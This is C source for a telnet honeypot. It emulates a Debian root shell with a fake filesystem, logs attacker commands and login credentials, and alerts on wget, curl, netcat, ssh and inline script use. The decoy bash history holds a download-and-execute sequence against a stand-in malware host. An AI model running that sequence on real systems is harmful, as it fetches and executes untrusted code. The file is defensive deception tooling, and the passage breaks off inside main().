#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>

#define PORT 2323
#define LOG_FILE "honeypot_audit.log"
#define MAX_INPUT 2048
#define MAX_BUFFER 4096
#define MAX_HISTORY 100

/* struct*/

typedef enum { TYPE_DIR, TYPE_FILE } NodeType;

typedef struct Node {
    char name[64];
    NodeType type;
    char content[1024];
    char permissions[12]; /* ex: "drwxr-xr-x" */
    char owner[32];
    char group[32];
    long size;
    time_t mtime;
    struct Node *parent;
    struct Node *child;
    struct Node *next;
} Node;

typedef struct {
    Node *current_node;
    char ip[INET_ADDRSTRLEN];
    char history[MAX_HISTORY][MAX_INPUT];
    int history_count;
    char env_path[256];
    char hostname[64];
    char username[32];
} Session;

/* gestion du systeme de fichier */

Node* create_node(const char *name, NodeType type, Node *parent) {
    Node *n = calloc(1, sizeof(Node));
    if (!n) return NULL;
    strncpy(n->name, name, 63);
    n->type = type;
    n->parent = parent;
    n->size = (type == TYPE_FILE) ? 0 : 4096;
    n->mtime = time(NULL);
    strncpy(n->owner, "root", 31);
    strncpy(n->group, "root", 31);
    if (type == TYPE_DIR)
        strncpy(n->permissions, "drwxr-xr-x", 11);
    else
        strncpy(n->permissions, "-rw-r--r--", 11);
    return n;
}

Node* create_file_with_content(const char *name, Node *parent, const char *content) {
    Node *n = create_node(name, TYPE_FILE, parent);
    if (!n) return NULL;
    strncpy(n->content, content, 1023);
    n->size = strlen(content);
    return n;
}

void add_child(Node *parent, Node *child) {
    if (!parent || !child) return;
    if (!parent->child) {
        parent->child = child;
    } else {
        Node *tmp = parent->child;
        while (tmp->next) tmp = tmp->next;
        tmp->next = child;
    }
}

Node* find_child(Node *parent, const char *name) {
    Node *tmp = parent->child;
    while (tmp) {
        if (strcmp(tmp->name, name) == 0) return tmp;
        tmp = tmp->next;
    }
    return NULL;
}

/* construit le chemin absolu du node courant */
void get_full_path(Node *node, char *out, size_t out_size) {
    if (node->parent == node) {
        strncpy(out, "/", out_size);
        return;
    }
    char parts[64][64];
    int depth = 0;
    Node *cur = node;
    while (cur->parent != cur && depth < 64) {
        strncpy(parts[depth++], cur->name, 63);
        cur = cur->parent;
    }
    out[0] = '\0';
    for (int i = depth - 1; i >= 0; i--) {
        strncat(out, "/", out_size - strlen(out) - 1);
        strncat(out, parts[i], out_size - strlen(out) - 1);
    }
}

/* supprime recursivement un node et ses enfants */
void free_node(Node *n) {
    if (!n) return;
    free_node(n->child);
    free_node(n->next);
    free(n);
}

/* supprime un enfant du parent (detachement + liberation) */
void remove_child(Node *parent, Node *target) {
    if (!parent->child) return;
    if (parent->child == target) {
        parent->child = target->next;
        target->next = NULL;
        free_node(target);
        return;
    }
    Node *tmp = parent->child;
    while (tmp->next && tmp->next != target) tmp = tmp->next;
    if (tmp->next == target) {
        tmp->next = target->next;
        target->next = NULL;
        free_node(target);
    }
}

/* init filesystem avec arborescence debian realiste (j'ai tout piqué sur internet) */
Node* init_filesystem() {
    Node *root = create_node("/", TYPE_DIR, NULL);
    root->parent = root;

    /* /bin */
    Node *bin = create_node("bin", TYPE_DIR, root);
    add_child(root, bin);
    const char *bins[] = {"bash","ls","cat","grep","find","chmod","cp","mv","rm",
                          "touch","mkdir","echo","pwd","uname","df","ps","id",NULL};
    for (int i = 0; bins[i]; i++) add_child(bin, create_node(bins[i], TYPE_FILE, bin));

    /* /sbin */
    Node *sbin = create_node("sbin", TYPE_DIR, root);
    add_child(root, sbin);
    const char *sbins[] = {"ifconfig","iptables","service","reboot","shutdown",NULL};
    for (int i = 0; sbins[i]; i++) add_child(sbin, create_node(sbins[i], TYPE_FILE, sbin));

    /* /etc */
    Node *etc = create_node("etc", TYPE_DIR, root);
    add_child(root, etc);

    add_child(etc, create_file_with_content("passwd", etc,
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "user:x:1000:1000:User,,,:/home/user:/bin/bash\n"));

    add_child(etc, create_file_with_content("shadow", etc,
        "root:$6$rounds=5000$saltstring$YFVfuFUEkKaF.0FKfRfQyA2vqbIjAVHqJoLHlsjb4R7LlEe2H0ILcMdflT/UKE9t/JKc3X..:19000:0:99999:7:::\n"
        "user:$6$rounds=5000$usersalt$XvwHD8r5oEkNjIGkCRJ0TiHxLz9S0eQ3VaLq7Jk8aBFYPpKqI4tXVCqRs7Tl5dF2L1.:19000:0:99999:7:::\n"));

    add_child(etc, create_file_with_content("hostname", etc, "debian\n"));

    add_child(etc, create_file_with_content("os-release", etc,
        "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\n"
        "NAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\n"
        "VERSION=\"11 (bullseye)\"\nID=debian\n"
        "HOME_URL=\"https://www.debian.org/\"\n"));

    add_child(etc, create_file_with_content("hosts", etc,
        "127.0.0.1 localhost\n127.0.1.1 debian\n"
        "::1 localhost ip6-localhost ip6-loopback\n"));

    Node *cron = create_node("cron.d", TYPE_DIR, etc);
    add_child(etc, cron);
    add_child(cron, create_file_with_content("backup", cron,
        "0 3 * * * root /usr/local/bin/backup.sh\n"));

    Node *ssh = create_node("ssh", TYPE_DIR, etc);
    add_child(etc, ssh);
    add_child(ssh, create_file_with_content("sshd_config", ssh,
        "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n"
        "X11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\n"
        "Subsystem sftp /usr/lib/openssh/sftp-server\n"));

    /* /home */
    Node *home = create_node("home", TYPE_DIR, root);
    add_child(root, home);
    Node *user_home = create_node("user", TYPE_DIR, home);
    add_child(home, user_home);
    add_child(user_home, create_file_with_content(".bash_history", user_home,
        "ls -la\nsudo su\nwget http://malware.example.com/payload\nchmod +x payload\n./payload\n"));
    add_child(user_home, create_file_with_content(".bashrc", user_home,
        "# ~/.bashrc\nexport PATH=/usr/local/bin:/usr/bin:/bin\nalias ll='ls -la'\n"));

    /* /root */
    Node *root_home = create_node("root", TYPE_DIR, root);
    add_child(root, root_home);
    add_child(root_home, create_file_with_content(".bash_history", root_home,
        "uname -a\ncat /etc/passwd\nps aux\nnetstat -tulnp\nhistory -c\n"));
    add_child(root_home, create_file_with_content(".ssh", root_home, ""));

    /* /tmp */
    Node *tmp_dir = create_node("tmp", TYPE_DIR, root);
    add_child(root, tmp_dir);

    /* /var */
    Node *var = create_node("var", TYPE_DIR, root);
    add_child(root, var);
    Node *log = create_node("log", TYPE_DIR, var);
    add_child(var, log);
    add_child(log, create_file_with_content("auth.log", log,
        "Feb 26 03:12:44 debian sshd[1234]: Accepted password for root from 192.168.1.55 port 54321 ssh2\n"
        "Feb 26 03:13:01 debian sshd[1235]: Failed password for root from 10.0.0.99 port 12345 ssh2\n"));
    add_child(log, create_file_with_content("syslog", log,
        "Feb 26 03:00:01 debian CRON[999]: (root) CMD (/usr/local/bin/backup.sh)\n"
        "Feb 26 03:10:00 debian kernel: [12345.678] eth0: renamed from veth\n"));

    /* /proc (simulé) */
    Node *proc = create_node("proc", TYPE_DIR, root);
    add_child(root, proc);
    add_child(proc, create_file_with_content("version", proc,
        "Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) "
        "(gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) "
        "#1 SMP Debian 5.10.149-2 (2022-10-21)\n"));
    add_child(proc, create_file_with_content("cpuinfo", proc,
        "processor\t: 0\nvendor_id\t: GenuineIntel\n"
        "model name\t: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz\n"
        "cpu cores\t: 1\nflags\t\t: fpu vme de pse tsc msr pae mce\n"));
    add_child(proc, create_file_with_content("meminfo", proc,
        "MemTotal:        1009288 kB\nMemFree:          123456 kB\n"
        "MemAvailable:    456789 kB\nBuffers:           12345 kB\n"
        "Cached:          234567 kB\nSwapTotal:       1048572 kB\nSwapFree:        987654 kB\n"));

    /* /usr */
    Node *usr = create_node("usr", TYPE_DIR, root);
    add_child(root, usr);
    Node *usr_bin = create_node("bin", TYPE_DIR, usr);
    add_child(usr, usr_bin);
    const char *usr_bins[] = {"wget","curl","python3","perl","gcc","make","git",
                               "ssh","scp","nc","nmap","vim","nano","awk","sed",NULL};
    for (int i = 0; usr_bins[i]; i++) add_child(usr_bin, create_node(usr_bins[i], TYPE_FILE, usr_bin));

    Node *usr_local = create_node("local", TYPE_DIR, usr);
    add_child(usr, usr_local);
    Node *usr_local_bin = create_node("bin", TYPE_DIR, usr_local);
    add_child(usr_local, usr_local_bin);
    add_child(usr_local_bin, create_file_with_content("backup.sh", usr_local_bin,
        "#!/bin/bash\ntar -czf /tmp/backup_$(date +%F).tar.gz /etc /home\n"));

    return root;
}

/* logging */

void log_event(const char *ip, const char *command) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return;
    time_t now = time(NULL);
    char *ts = ctime(&now);
    ts[strlen(ts) - 1] = '\0';
    fprintf(f, "[%s] [IP:%s] CMD: %s\n", ts, ip, command);
    fflush(f);
    fclose(f);
}

/* utilitaires */

/* resolution de chemin: absolu ou relatif -> node cible */
Node* resolve_path(Node *current, Node *root, const char *path) {
    if (!path || strlen(path) == 0) return current;

    Node *start = (path[0] == '/') ? root : current;
    char tmp[512];
    strncpy(tmp, path, 511);

    char *token = strtok(tmp, "/");
    while (token) {
        if (strcmp(token, ".") == 0) {
            /* on reste */
        } else if (strcmp(token, "..") == 0) {
            start = start->parent;
        } else {
            Node *child = find_child(start, token);
            if (!child) return NULL;
            start = child;
        }
        token = strtok(NULL, "/");
    }
    return start;
}

void add_to_history(Session *s, const char *cmd) {
    if (s->history_count < MAX_HISTORY) {
        strncpy(s->history[s->history_count++], cmd, MAX_INPUT - 1);
    } else {
        /* ring buffer smpl: on decale */
        memmove(s->history[0], s->history[1], sizeof(s->history[0]) * (MAX_HISTORY - 1));
        strncpy(s->history[MAX_HISTORY - 1], cmd, MAX_INPUT - 1);
    }
}

/* moteur de commande */

void handle_command(int sock, char *input, Session *s, Node *fs_root) {
    char buffer[MAX_BUFFER] = {0};

    /* nettoyage \r\n */
    input[strcspn(input, "\r\n")] = '\0';
    if (strlen(input) == 0) return;

    log_event(s->ip, input);
    add_to_history(s, input);

    /* tokenisation (commande + args) */
    char input_copy[MAX_INPUT];
    strncpy(input_copy, input, MAX_INPUT - 1);

    char *argv[64];
    int argc = 0;
    char *token = strtok(input_copy, " ");
    while (token && argc < 63) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }
    argv[argc] = NULL;

    if (argc == 0) return;
    const char *cmd = argv[0];

    /*  ls  */
    if (strcmp(cmd, "ls") == 0) {
        int flag_l = 0, flag_a = 0;
        Node *target = s->current_node;

        for (int i = 1; i < argc; i++) {
            if (argv[i][0] == '-') {
                if (strchr(argv[i], 'l')) flag_l = 1;
                if (strchr(argv[i], 'a')) flag_a = 1;
            } else {
                Node *n = resolve_path(s->current_node, fs_root, argv[i]);
                if (n) target = n;
                else { snprintf(buffer, MAX_BUFFER, "ls: cannot access '%s': No such file or directory\r\n", argv[i]); goto send_buf; }
            }
        }

        if (flag_a) {
            if (flag_l)
                snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                    "%s 1 root root 4096 Feb 26 03:12 .\r\n"
                    "%s 1 root root 4096 Feb 26 03:12 ..\r\n",
                    target->permissions, target->permissions);
            else strcat(buffer, ".  ..  ");
        }

        Node *tmp = target->child;
        while (tmp) {
            if (flag_l) {
                char tstr[32];
                struct tm *tm = localtime(&tmp->mtime);
                strftime(tstr, sizeof(tstr), "%b %d %H:%M", tm);
                snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                    "%s 1 %-8s %-8s %8ld %s %s\r\n",
                    tmp->permissions, tmp->owner, tmp->group, tmp->size, tstr, tmp->name);
            } else {
                strncat(buffer, tmp->name, MAX_BUFFER - strlen(buffer) - 4);
                strncat(buffer, (tmp->type == TYPE_DIR) ? "/  " : "  ", MAX_BUFFER - strlen(buffer) - 1);
            }
            tmp = tmp->next;
        }
        strcat(buffer, "\r\n");
    }

    /*  cd  */
    else if (strcmp(cmd, "cd") == 0) {
        if (!argv[1] || strcmp(argv[1], "~") == 0 || strcmp(argv[1], "/root") == 0) {
            Node *r = resolve_path(s->current_node, fs_root, "/root");
            if (r) s->current_node = r;
        } else if (strcmp(argv[1], "/") == 0) {
            while (s->current_node->parent != s->current_node)
                s->current_node = s->current_node->parent;
        } else {
            Node *target = resolve_path(s->current_node, fs_root, argv[1]);
            if (target && target->type == TYPE_DIR) s->current_node = target;
            else snprintf(buffer, MAX_BUFFER, "-bash: cd: %s: No such file or directory\r\n", argv[1]);
        }
    }

    /*  pwd  */
    else if (strcmp(cmd, "pwd") == 0) {
        char path[512];
        get_full_path(s->current_node, path, sizeof(path));
        snprintf(buffer, MAX_BUFFER, "%s\r\n", path);
    }

    /*  cat  */
    else if (strcmp(cmd, "cat") == 0) {
        if (!argv[1]) {
            strncpy(buffer, "cat: usage: cat [file...]\r\n", MAX_BUFFER - 1);
        } else {
            for (int i = 1; i < argc; i++) {
                Node *target = resolve_path(s->current_node, fs_root, argv[i]);
                if (target && target->type == TYPE_FILE)
                    snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer), "%s\r\n", target->content);
                else
                    snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                        "cat: %s: No such file or directory\r\n", argv[i]);
            }
        }
    }

    /*  echo  */
    else if (strcmp(cmd, "echo") == 0) {
        int newline = 1;
        int start = 1;
        if (argv[1] && strcmp(argv[1], "-n") == 0) { newline = 0; start = 2; }
        for (int i = start; i < argc; i++) {
            strncat(buffer, argv[i], MAX_BUFFER - strlen(buffer) - 2);
            if (i < argc - 1) strncat(buffer, " ", MAX_BUFFER - strlen(buffer) - 1);
        }
        if (newline) strncat(buffer, "\r\n", MAX_BUFFER - strlen(buffer) - 1);
    }

    /*  mkdir  */
    else if (strcmp(cmd, "mkdir") == 0) {
        if (!argv[1]) strncpy(buffer, "mkdir: missing operand\r\n", MAX_BUFFER - 1);
        else {
            for (int i = 1; i < argc; i++) {
                if (find_child(s->current_node, argv[i]))
                    snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                        "mkdir: cannot create directory '%s': File exists\r\n", argv[i]);
                else
                    add_child(s->current_node, create_node(argv[i], TYPE_DIR, s->current_node));
            }
        }
    }

    /*  touch  */
    else if (strcmp(cmd, "touch") == 0) {
        if (!argv[1]) strncpy(buffer, "touch: missing file operand\r\n", MAX_BUFFER - 1);
        else {
            for (int i = 1; i < argc; i++) {
                Node *existing = find_child(s->current_node, argv[i]);
                if (existing) existing->mtime = time(NULL);
                else add_child(s->current_node, create_node(argv[i], TYPE_FILE, s->current_node));
            }
        }
    }

    /*  rm  */
    else if (strcmp(cmd, "rm") == 0) {
        int flag_r = 0, flag_f = 0;
        int file_start = 1;
        for (int i = 1; i < argc; i++) {
            if (argv[i][0] == '-') {
                if (strchr(argv[i], 'r') || strchr(argv[i], 'R')) flag_r = 1;
                if (strchr(argv[i], 'f')) flag_f = 1;
                file_start = i + 1;
            } else break;
        }
        for (int i = file_start; i < argc; i++) {
            Node *target = resolve_path(s->current_node, fs_root, argv[i]);
            if (!target) {
                if (!flag_f) snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                    "rm: cannot remove '%s': No such file or directory\r\n", argv[i]);
            } else if (target->type == TYPE_DIR && !flag_r) {
                snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                    "rm: cannot remove '%s': Is a directory\r\n", argv[i]);
            } else {
                remove_child(target->parent, target);
            }
        }
    }

    /*  cp  */
    else if (strcmp(cmd, "cp") == 0) {
        if (argc < 3) strncpy(buffer, "cp: missing file operand\r\n", MAX_BUFFER - 1);
        else {
            Node *src = resolve_path(s->current_node, fs_root, argv[1]);
            if (!src) snprintf(buffer, MAX_BUFFER, "cp: cannot stat '%s': No such file or directory\r\n", argv[1]);
            else if (src->type == TYPE_DIR) strncpy(buffer, "cp: omitting directory (use -r)\r\n", MAX_BUFFER - 1);
            else {
                Node *dst_parent = s->current_node;
                char *dst_name = argv[2];
                Node *existing = resolve_path(s->current_node, fs_root, argv[2]);
                if (existing && existing->type == TYPE_DIR) {
                    dst_parent = existing;
                    dst_name = src->name;
                }
                Node *new_node = create_file_with_content(dst_name, dst_parent, src->content);
                add_child(dst_parent, new_node);
            }
        }
    }

    /*  mv  */
    else if (strcmp(cmd, "mv") == 0) {
        if (argc < 3) strncpy(buffer, "mv: missing file operand\r\n", MAX_BUFFER - 1);
        else {
            Node *src = resolve_path(s->current_node, fs_root, argv[1]);
            if (!src) snprintf(buffer, MAX_BUFFER, "mv: cannot stat '%s': No such file or directory\r\n", argv[1]);
            else {
                Node *dst = resolve_path(s->current_node, fs_root, argv[2]);
                if (dst && dst->type == TYPE_DIR) {
                    /* deplace dans le repertoire cible */
                    remove_child(src->parent, src);
                    src->parent = dst;
                    src->next = NULL;
                    add_child(dst, src);
                } else {
                    /* renommage */
                    strncpy(src->name, argv[2], 63);
                }
            }
        }
    }

    /*  chmod  */
    else if (strcmp(cmd, "chmod") == 0) {
        if (argc < 3) strncpy(buffer, "chmod: missing operand\r\n", MAX_BUFFER - 1);
        else {
            Node *target = resolve_path(s->current_node, fs_root, argv[2]);
            if (!target) snprintf(buffer, MAX_BUFFER, "chmod: cannot access '%s': No such file or directory\r\n", argv[2]);
            /* on accepte silencieusement, le honeypot ne fait pas vraiment appliquer les perms */
        }
    }

    /*  grep  */
    else if (strcmp(cmd, "grep") == 0) {
        if (argc < 3) strncpy(buffer, "grep: usage: grep PATTERN FILE\r\n", MAX_BUFFER - 1);
        else {
            Node *target = resolve_path(s->current_node, fs_root, argv[2]);
            if (!target || target->type != TYPE_FILE) {
                snprintf(buffer, MAX_BUFFER, "grep: %s: No such file or directory\r\n", argv[2]);
            } else {
                /* recherche ligne par ligne */
                char content_copy[1024];
                strncpy(content_copy, target->content, 1023);
                char *line = strtok(content_copy, "\n");
                while (line) {
                    if (strstr(line, argv[1]))
                        snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer), "%s\r\n", line);
                    line = strtok(NULL, "\n");
                }
            }
        }
    }

    /*  find  */
    else if (strcmp(cmd, "find") == 0) {
        /* find [path] [-name pattern] – version simplifiee */
        Node *start = s->current_node;
        const char *pattern = NULL;
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-name") == 0 && i + 1 < argc) { pattern = argv[++i]; }
            else {
                Node *n = resolve_path(s->current_node, fs_root, argv[i]);
                if (n) start = n;
            }
        }
        /* BFS/DFS recursif via fct locale (iteratif avec pile) */
        Node *stack[256]; int top = 0;
        stack[top++] = start;
        while (top > 0) {
            Node *cur = stack[--top];
            char path[512]; get_full_path(cur, path, sizeof(path));
            int match = (!pattern || strstr(cur->name, pattern) != NULL);
            if (match) snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer), "%s\r\n", path);
            Node *child = cur->child;
            while (child && top < 255) { stack[top++] = child; child = child->next; }
        }
    }

    /*  whoami  */
    else if (strcmp(cmd, "whoami") == 0) {
        snprintf(buffer, MAX_BUFFER, "%s\r\n", s->username);
    }

    /*  id  */
    else if (strcmp(cmd, "id") == 0) {
        snprintf(buffer, MAX_BUFFER, "uid=0(root) gid=0(root) groups=0(root)\r\n");
    }

    /*  uname  */
    else if (strcmp(cmd, "uname") == 0) {
        int flag_a = (argv[1] && strcmp(argv[1], "-a") == 0);
        int flag_r = (argv[1] && strcmp(argv[1], "-r") == 0);
        if (flag_a)
            snprintf(buffer, MAX_BUFFER, "Linux %s 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux\r\n", s->hostname);
        else if (flag_r)
            strncpy(buffer, "5.10.0-19-amd64\r\n", MAX_BUFFER - 1);
        else
            strncpy(buffer, "Linux\r\n", MAX_BUFFER - 1);
    }

    /*  hostname  */
    else if (strcmp(cmd, "hostname") == 0) {
        snprintf(buffer, MAX_BUFFER, "%s\r\n", s->hostname);
    }

    /*  ps  */
    else if (strcmp(cmd, "ps") == 0) {
        strncpy(buffer,
            "  PID TTY          TIME CMD\r\n"
            "    1 ?        00:00:02 systemd\r\n"
            "  423 ?        00:00:00 sshd\r\n"
            "  891 pts/0    00:00:00 bash\r\n"
            "  892 pts/0    00:00:00 ps\r\n",
            MAX_BUFFER - 1);
        /* ps aux */
        if (argv[1] && strstr(argv[1], "a"))
            strncat(buffer,
                "root         1  0.0  0.3  systemd\r\n"
                "root       423  0.0  0.1  sshd\r\n"
                "root       891  0.0  0.2  bash\r\n",
                MAX_BUFFER - strlen(buffer) - 1);
    }

    /*  ifconfig  */
    else if (strcmp(cmd, "ifconfig") == 0 || strcmp(cmd, "ip") == 0) {
        strncpy(buffer,
            "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n"
            "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\r\n"
            "        inet6 fe80::a00:27ff:febb:c0d3  prefixlen 64  scopeid 0x20<link>\r\n"
            "        ether 08:00:27:bb:c0:d3  txqueuelen 1000  (Ethernet)\r\n"
            "        RX packets 12345  bytes 1234567 (1.1 MiB)\r\n"
            "        TX packets 6789   bytes 345678 (337.6 KiB)\r\n\r\n"
            "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\r\n"
            "        inet 127.0.0.1  netmask 255.0.0.0\r\n"
            "        loop  txqueuelen 1000  (Local Loopback)\r\n",
            MAX_BUFFER - 1);
    }

    /*  wget  */
    else if (strcmp(cmd, "wget") == 0 || strcmp(cmd, "curl") == 0) {
        if (!argv[1]) strncpy(buffer, "wget: missing URL\r\n", MAX_BUFFER - 1);
        else {
            /* on log mais on simule un telechargement */
            char log_msg[512];
            snprintf(log_msg, sizeof(log_msg), "ALERTE: DOWNLOAD TENTE: %s", argv[1]);
            log_event(s->ip, log_msg);
            snprintf(buffer, MAX_BUFFER,
                "--2024-02-26 03:12:44--  %s\r\n"
                "Resolving host... failed: Name or service not known.\r\n"
                "wget: unable to resolve host address '%s'\r\n", argv[1], argv[1]);
        }
    }

    /*  uptime  */
    else if (strcmp(cmd, "uptime") == 0) {
        strncpy(buffer, " 03:12:44 up 14 days,  3:22,  1 user,  load average: 0.00, 0.00, 0.00\r\n", MAX_BUFFER - 1);
    }

    /*  df  */
    else if (strcmp(cmd, "df") == 0) {
        strncpy(buffer,
            "Filesystem     1K-blocks    Used Available Use% Mounted on\r\n"
            "/dev/sda1       10474496 2345678   7593252  24% /\r\n"
            "tmpfs             504644       0    504644   0% /dev/shm\r\n"
            "/dev/sda2        1048576   12345   1036231   2% /boot\r\n",
            MAX_BUFFER - 1);
    }

    /*  free  */
    else if (strcmp(cmd, "free") == 0) {
        strncpy(buffer,
            "              total        used        free      shared  buff/cache   available\r\n"
            "Mem:        1009288      456789      123456        1234      429043      456789\r\n"
            "Swap:       1048572       65432      983140\r\n",
            MAX_BUFFER - 1);
    }

    /*  env / printenv  */
    else if (strcmp(cmd, "env") == 0 || strcmp(cmd, "printenv") == 0) {
        snprintf(buffer, MAX_BUFFER,
            "SHELL=/bin/bash\r\nTERM=xterm\r\nUSER=%s\r\n"
            "PATH=%s\r\nPWD=/root\r\nHOME=/root\r\n"
            "LANG=en_US.UTF-8\r\nLOGNAME=root\r\n",
            s->username, s->env_path);
    }

    /*  history  */
    else if (strcmp(cmd, "history") == 0) {
        for (int i = 0; i < s->history_count; i++)
            snprintf(buffer + strlen(buffer), MAX_BUFFER - strlen(buffer),
                " %4d  %s\r\n", i + 1, s->history[i]);
    }

    /*  su  */
    else if (strcmp(cmd, "su") == 0) {
        /* On simule un échec d'authentification sauf si déjà root */
        strncpy(buffer, "Authentication failure\r\n", MAX_BUFFER - 1);
    }

    /*  ssh  */
    else if (strcmp(cmd, "ssh") == 0) {
        if (!argv[1]) strncpy(buffer, "ssh: missing host\r\n", MAX_BUFFER - 1);
        else {
            char log_msg[512];
            snprintf(log_msg, sizeof(log_msg), "ALERTE: CONNEXION SSH TENTEE VERS: %s", argv[1]);
            log_event(s->ip, log_msg);
            snprintf(buffer, MAX_BUFFER, "ssh: connect to host %s port 22: Connection refused\r\n", argv[1]);
        }
    }

    /*  nc / ncat / netcat  */
    else if (strcmp(cmd, "nc") == 0 || strcmp(cmd, "ncat") == 0 || strcmp(cmd, "netcat") == 0) {
        char log_msg[512];
        snprintf(log_msg, sizeof(log_msg), "ALERTE: NETCAT UTILISE: %s", input);
        log_event(s->ip, log_msg);
        strncpy(buffer, "Ncat: Connection refused.\r\n", MAX_BUFFER - 1);
    }

    /*  python / perl / php  */
    else if (strncmp(cmd, "python", 6) == 0 || strcmp(cmd, "perl") == 0 || strcmp(cmd, "php") == 0) {
        if (argv[1] && strcmp(argv[1], "-c") == 0 && argv[2]) {
            char log_msg[512];
            snprintf(log_msg, sizeof(log_msg), "ALERTE: EXEC CODE: %s %s", cmd, argv[2]);
            log_event(s->ip, log_msg);
        }
        strncpy(buffer, "Segmentation fault (core dumped)\r\n", MAX_BUFFER - 1);
    }

    /* clear */
    else if (strcmp(cmd, "clear") == 0) {
        strncpy(buffer, "\033[2J\033[H", MAX_BUFFER - 1);
    }

    /*  reboot / shutdown / halt  */
    else if (strcmp(cmd, "reboot") == 0 || strcmp(cmd, "shutdown") == 0 || strcmp(cmd, "halt") == 0) {
        char log_msg[256];
        snprintf(log_msg, sizeof(log_msg), "ALERTE: REBOOT/SHUTDOWN TENTE: %s", cmd);
        log_event(s->ip, log_msg);
        strncpy(buffer, "\r\nBroadcast message from root@debian:\r\nThe system is going down for reboot NOW!\r\n", MAX_BUFFER - 1);
        send(sock, buffer, strlen(buffer), 0);
        close(sock);
        exit(0);
    }

    /* logout ou exit */
    else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "logout") == 0) {
        strncpy(buffer, "logout\r\n", MAX_BUFFER - 1);
        send(sock, buffer, strlen(buffer), 0);
        close(sock);
        exit(0);
    }

    /* pas commande*/
    else {
        snprintf(buffer, MAX_BUFFER, "-bash: %s: command not found\r\n", cmd);
    }

send_buf:
    if (strlen(buffer) > 0)
        send(sock, buffer, strlen(buffer), 0);
}

/* gestion de session */

void run_honeypot(int client_sock, struct sockaddr_in addr, Node *fs_root) {
    Session s;
    memset(&s, 0, sizeof(s));
    s.current_node = fs_root;

    /* nav init vers /root */
    Node *root_home = resolve_path(fs_root, fs_root, "/root");
    if (root_home) s.current_node = root_home;

    strncpy(s.ip, inet_ntoa(addr.sin_addr), INET_ADDRSTRLEN - 1);
    strncpy(s.hostname, "debian", 63);
    strncpy(s.username, "root", 31);
    strncpy(s.env_path, "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 255);

    log_event(s.ip, "ALERTE: NOUVELLE CONNEXION");

    /* banniere */
    const char *banner =
        "\r\nDebian GNU/Linux 11 (bullseye)\r\n"
        "Kernel 5.10.0-19-amd64 on an x86_64\r\n\r\n"
        "debian login: ";
    send(client_sock, banner, strlen(banner), 0);

    char junk[256] = {0};
    recv(client_sock, junk, sizeof(junk) - 1, 0);
    junk[strcspn(junk, "\r\n")] = '\0';
    if (strlen(junk) > 0) {
        char log_buf[512];
        snprintf(log_buf, sizeof(log_buf), "LOGIN TENTATIVE username: %.200s", junk);
        log_event(s.ip, log_buf);
    }

    send(client_sock, "Password: ", 10, 0);
    memset(junk, 0, sizeof(junk));
    recv(client_sock, junk, sizeof(junk) - 1, 0);
    junk[strcspn(junk, "\r\n")] = '\0';
    if (strlen(junk) > 0) {
        char log_buf[512];
        snprintf(log_buf, sizeof(log_buf), "LOGIN TENTATIVE password: %.200s", junk);
        log_event(s.ip, log_buf);
    }

    /* MOTD */
    const char *motd =
        "\r\nLast login: Mon Feb 24 22:11:03 2025 from 185.220.101.45\r\n"
        "Linux debian 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\r\n\r\n"
        "The programs included with the Debian GNU/Linux system are free software;\r\n"
        "the exact distribution terms for each program are described in the\r\n"
        "individual files in /usr/share/doc/*/copyright.\r\n\r\n"
        "Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\r\n"
        "permitted by applicable law.\r\n";
    send(client_sock, motd, strlen(motd), 0);

    /* bcl principale */
    while (1) {
        char path[512];
        get_full_path(s.current_node, path, sizeof(path));

        char prompt[640];
        snprintf(prompt, sizeof(prompt), "root@%s:%s# ", s.hostname, path);
        send(client_sock, prompt, strlen(prompt), 0);

        char input[MAX_INPUT] = {0};
        int bytes = recv(client_sock, input, MAX_INPUT - 1, 0);
        if (bytes <= 0) break;

        /* gestion pipe simple: on traite chaque ss commande separement */
        char *pipe_cmd = strtok(input, "|");
        while (pipe_cmd) {
            while (*pipe_cmd == ' ') pipe_cmd++;
            handle_command(client_sock, pipe_cmd, &s, fs_root);
            pipe_cmd = strtok(NULL, "|");
        }
    }

    log_event(s.ip, "DECONNEXION");
    close(client_sock);
}

/* main */

/* evite les zombies */
void sigchld_handler(int sig) {
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

int main() {
    signal(SIGCHLD, sigchld_handler);

    Node *fs_root = init_filesystem();

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return 1; }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in address = {
